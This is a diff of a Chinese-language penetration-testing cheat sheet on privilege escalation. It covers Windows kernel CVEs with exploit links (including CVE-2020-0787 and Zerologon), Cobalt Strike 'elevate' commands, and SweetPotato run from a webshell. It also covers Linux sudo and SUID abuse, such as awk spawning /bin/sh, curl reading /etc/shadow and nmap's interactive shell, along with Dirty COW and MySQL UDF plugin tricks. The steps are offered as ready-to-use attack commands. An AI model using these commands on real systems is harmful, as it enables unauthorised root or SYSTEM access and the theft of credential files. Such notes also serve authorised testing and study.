@@ -1,7 +1,7 @@
 ---
-title: 【权限维持】权限提升
+title: 权限提升
 ---
-## 权限提升
+
 ## 提权的基础概念
 
 **Windows上常见的权限分类：**
@@ -24,11 +24,11 @@ title: 【权限维持】权限提升
 
 **横向提权**：在系统A中获取了系统B中同级别的角色权限。
 
-**常用的提权方法：**
+**常用的提权方法**：
 
 系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权（利用率较高）。
 
-利用windows系统错误配置提权（可信服务路径漏洞，组策略首选项等，利用率不高）。
+利用windows系统错误配置提权（可信服务路径漏洞，组策略首选项等）
 
 ## Windows提权
 
@@ -36,13 +36,15 @@ title: 【权限维持】权限提升
 
 ### 内核漏洞提权
 
-| 漏洞代号 | 补丁编号  | 适用平台                         | 用途        |
-| :------- | :-------- | :------------------------------- | :---------- |
-| MS14-058 | KB3000061 | 03，08，12，Win7                 | 本地提权    |
-| MS14-068 | KB3011780 | 域控未安装补丁的域内，03，08，12 | 域内提权    |
-| MS15-051 | KB3057191 | 03，08，12，Win7                 | 本地提权    |
-| MS16-032 | KB3143141 | 08 r2以后，12，Win7              | 本地提权    |
-| MS17-010 | KB4013389 | 03，08，12，16，win7             | 远程注入dll |
+| 漏洞代号      | 补丁编号  | 适用平台                         | 用途              |
+| :------------ | :-------- | :------------------------------- | :---------------- |
+| MS14-058      | KB3000061 | 03，08，12，Win7                 | 本地提权          |
+| MS14-068      | KB3011780 | 域控未安装补丁的域内，03，08，12 | 域内提权          |
+| MS15-051      | KB3057191 | 03，08，12，Win7                 | 本地提权          |
+| MS16-032      | KB3143141 | 08 r2以后，12，Win7              | 本地提权          |
+| MS17-010      | KB4013389 | 03，08，12，16，win7             | 远程注入dll       |
+| CVE-2020-0787 |           | all                              | windows全版本提权 |
+| CVE-2020-1472 |           | domain                           | 域内提权          |
 
 **快速检测目标系统未打漏洞补丁**
 
@@ -50,7 +52,21 @@ title: 【权限维持】权限提升
 systeminfo > temp.txt&(for %i in (KB3000061 KB3011780 KB3057191 KB3143141 KB4013389) do @type temp.txt|@find /i  "%i"|| @echo %i Not Installed!)&del /f /q /a temp.txt
 ```
 
-补丁号根据自己需求加，利用的话`MSF`中有相关EXP或者自行搜索（`Github`， `searchsploit` ）
+补丁号根据自己需求加，利用MSF`中有相关EXP或者自行搜索 Github，searchsploit`
+
+**CVE-2020-0787**
+
+直接下载EXP到目标主机上执行（需要上桌面，会弹出一个system权限的cmd窗口）
+
+https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION
+
+**CVE-2020-1472**
+
+POC：https://github.com/dirkjanm/CVE-2020-1472
+
+Test-EXP：https://github.com/SecuraBV/CVE-2020-1472/
+
+推荐把py打包成exe使用，虽然体积大点但是比装py环境方便
 
 ### 利用Cobalt Strike提权
 
@@ -65,7 +81,7 @@ sleep 0
 shell whoami
 ```
 
-**如果你有一个Administrator权限的Beacon，用以下命令提升到SYSTEM权限：**
+**1、如果你有一个Administrator权限的Beacon，用以下命令提升到SYSTEM权限：**
 
 这个需要创建服务
 
@@ -73,7 +89,7 @@ shell whoami
 elevate svc-exe test1（你的监听器）
 ```
 
-**如果你是普通`本地`用户权限，用以下命令提升到高权限**
+**2、如果你是普通`本地`用户权限，用以下命令提升到高权限**
 
 注意：如果是`域`用户会弹出认证窗口，不能提权
 
@@ -81,13 +97,19 @@ elevate svc-exe test1（你的监听器）
 elevate uac-token-duplication test1
 ```
 
-然后可以用上边的`svc-exe`提权到SYSTEM
+然后可以用上边的`svc-exe`再提权到SYSTEM
 
 ### C#版的烂土豆（来自QAX零队）
 
+实测Win7、Win8、08、12等可用
+
 项目地址：https://github.com/uknowsec/SweetPotato
 
-能在webshell下执行命令的版本 
+直接在Webshell下执行
+
+```bash
+SweetPotato.exe -a whoami
+```
 
 ## Linux提权
 
@@ -99,13 +121,19 @@ elevate uac-token-duplication test1
 
 ### 内核溢出漏洞提权
 
-**信息收集**
+1、信息收集
 
 ```bash
 uname -a	#查看系统版本内核信息
+
+#centos
+hostnamectl	#查看系统版本内核详细信息，推荐这个命令
+
+#ubuntu
+lsb_release -a
 ```
 
-**使用 `searchsploit` 查找相关内核漏洞**
+2、使用 `searchsploit` 查找相关内核漏洞
 
 下载地址：https://github.com/offensive-security/exploitdb
 
@@ -113,15 +141,18 @@ uname -a	#查看系统版本内核信息
 searchsploit linux 3.10 CentOS Linux 7
 ```
 
-**或使用 `linux-exploit-suggester-2.pl` 在目标机器上执行**
+例如经典的**脏牛提权**~可以用Vulnhub的lampiao这个靶机去做实验
 
-下载地址：https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl
+下载脏牛：https://github.com/gbonacini/CVE-2016-5195
 
 ```bash
-./linux-exploit-suggester-2.pl
+./dcow -s
 ```
 
-典型的脏牛提权
+问题记录：
+
+Win10子系统的 g++编译环境安装一直报错，最终发现 Ubuntu 20.04.1 LTS 版本跟apt源不匹配，使用最新的阿里源即可
+编译好后又报错cannot execute binary file: Exec format error，原因是系统版本和g++版本差异造成的，将源码上传到目标系统编译执行，成功执行
 
 ### sudo滥用
 
@@ -133,27 +164,30 @@ sudo -l	#查看当前用户可以sudo的程序
 
 **AWK：**
 
-```
-sudo awk 'BEGIN {system("/bin/sh")}'	#通过生成交互式系统外Shell序来脱离受限环境，需要普通用户的密码
+```bash
+sudo awk 'BEGIN {system("/bin/sh")}'	
+#通过生成交互式系统外Shell来脱离受限环境，需要普通用户的密码
 ```
 
 **CURL：**
 
-```
+```bash
 sudo curl file:///etc/shadow
 ```
 
 ### SUID提权
 
-SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行【ls 查看时有 s 属性才支持 SUID】
+SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行
 
-**查找正在系统上运行的所有SUID可执行文件**
+【ls 查看时有 s 属性才支持 SUID】
+
+1、查找正在系统上运行的所有SUID可执行文件
 
 ```bash
 find / -user root -perm -4000 -print 2>/dev/null
 ```
 
-**比如发现了find**
+2、比如发现了find
 
 ```bash
 #随便新建一个文件，或利用已有文件
@@ -163,10 +197,11 @@ touch abc
 find abc -exec whomai \;
 ```
 
-**nmap SUID提权**
+3、例子 {nmap SUID提权}
 
 ```bash
 #2.02 to 5.21版本 用交互模式执行shell命令
+
 sudo nmap --interactive		
 nmap> !sh
 ```
@@ -189,6 +224,8 @@ sudo su
 ```
 
 ## 数据库提权
+
+以下数据库提权方法 `server 2003`之前的系统才可用
 
 ### MySQL数据库提权
 
@@ -277,7 +314,8 @@ show variables like %plugin%
  如果plugin不存在，可以用NTFS ADS流来创建文件夹并导入dll
 
 ```bash
-#先找到Mysql的目录select @@basedir;#利用ADS流来创建plugin文件夹（测试并不能成功创建）select 'It is dll' into dumpfile 'C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION';
+#先找到Mysql的目录select @@basedir;
+#利用ADS流来创建plugin文件夹（测试并不能成功创建）select 'It is dll' into dumpfile 'C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION';
 ```
 
 网上流传的是在数据库中直接就能利用ADS流创建plugin文件夹，但我测试发现直接导入文件可以，并不能创建文件夹。
